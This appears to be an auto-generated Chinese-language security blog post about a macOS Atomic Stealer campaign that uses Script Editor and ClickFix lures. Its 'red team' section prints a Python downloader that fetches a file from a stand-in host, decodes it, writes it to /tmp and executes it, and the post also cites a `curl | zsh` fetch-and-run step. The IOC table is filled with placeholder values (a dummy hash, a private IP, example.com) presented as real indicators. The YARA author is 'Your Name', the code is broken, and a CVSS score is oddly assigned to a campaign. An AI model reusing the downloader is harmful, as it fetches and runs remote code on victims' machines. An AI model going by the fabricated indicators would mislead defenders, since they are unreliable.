---
layout: post
title:  "New macOS stealer campaign uses Script Editor in ClickFix attack"
date:   2026-04-08 19:08:32 +0000
categories: [security]
severity: high
---

# 🔥 解析 macOS Atomic Stealer 惡意軟體的利用與防禦繞過

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Script Editor`, `ClickFix`, `curl | zsh`, `base64 + gzip`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: macOS 的 Script Editor 應用程式允許執行 AppleScript 和 JXA 腳本，且可以執行本地腳本和 shell 命令。惡意軟體利用這一點，通過 `applescript://` URL 方案啟動 Script Editor，並執行預先填充的可執行代碼。
* **攻擊流程圖解**:
  1. 使用者訪問假的 Apple 主題網站。
  2. 網站使用 `applescript://` URL 方案啟動 Script Editor。
  3. Script Editor 執行預先填充的可執行代碼。
  4. 代碼下載並執行惡意軟體。
* **受影響元件**: macOS 10.15 或更高版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 使用者需要訪問假的 Apple 主題網站。
* **Payload 建構邏輯**:

    ```
    
    python
    import base64
    import gzip
    import subprocess
    
    # 下載並執行惡意軟體
    def download_and_execute():
        url = "https://example.com/malware"
        response = requests.get(url)
        payload = base64.b64decode(response.content)
        with open("/tmp/helper", "wb") as f:
            f.write(gzip.decompress(payload))
        subprocess.run(["chmod", "+x", "/tmp/helper"])
        subprocess.run(["/tmp/helper"])
    
    download_and_execute()
    
    ```
* **繞過技術**: 惡意軟體使用 `curl | zsh` 命令下載並執行 payload，繞過了 macOS 的安全機制。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /tmp/helper |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Atomic_Stealer {
        meta:
            description = "Detects Atomic Stealer malware"
            author = "Your Name"
        strings:
            $a = "applescript://"
            $b = "curl | zsh"
        condition:
            $a and $b
    }
    
    ```
* **緩解措施**: 使用者應該避免訪問假的 Apple 主題網站，並在執行 Script Editor 時謹慎小心。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Script Editor**: 一個 macOS 應用程式，允許使用者編寫和執行 AppleScript 和 JXA 腳本。
* **ClickFix**: 一種社交工程技術，利用使用者點擊假的連結或按鈕來執行惡意代碼。
* **base64 + gzip**: 一種壓縮和編碼技術，常用於惡意軟體的 payload 中。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/new-macos-stealer-campaign-uses-script-editor-in-clickfix-attack/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


